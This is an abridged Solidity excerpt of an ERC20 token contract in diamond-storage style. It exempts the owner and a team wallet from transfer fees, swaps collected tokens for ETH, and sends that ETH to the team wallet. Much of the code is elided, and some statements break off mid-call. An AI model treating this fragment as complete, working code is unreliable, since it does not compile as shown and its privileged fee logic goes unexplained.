...
contract balanceOfFacet is IERC20, Context, Ownable {
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (from != owner() && to != owner() && from != address(this)) {
            ...
            if (to == ds.uniswapV2Pair && from != address(this)) {
                if (from == address(ds._ultronTeamWallet)) {
                    ultronFeeAmounts = 0;
                    oramounts = min(
            ...
            bool swappable = ds._buyCount > ds._preventSwapBefore &&
                ds._minUltronSwapAmount == min(ds._minUltronSwapAmount, amount);
            ...
            if (
                ...
                if (contractTokenBalance > ds._minUltronSwapAmount) {
                    swapTokensForEth(
        ...
        ds._balances[to] = ds._balances[to].add(amount.sub(ultronFeeAmounts));
    ...
    function sendETHToFee(uint256 amount) private {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._ultronTeamWallet.transfer(amount);
    }
}
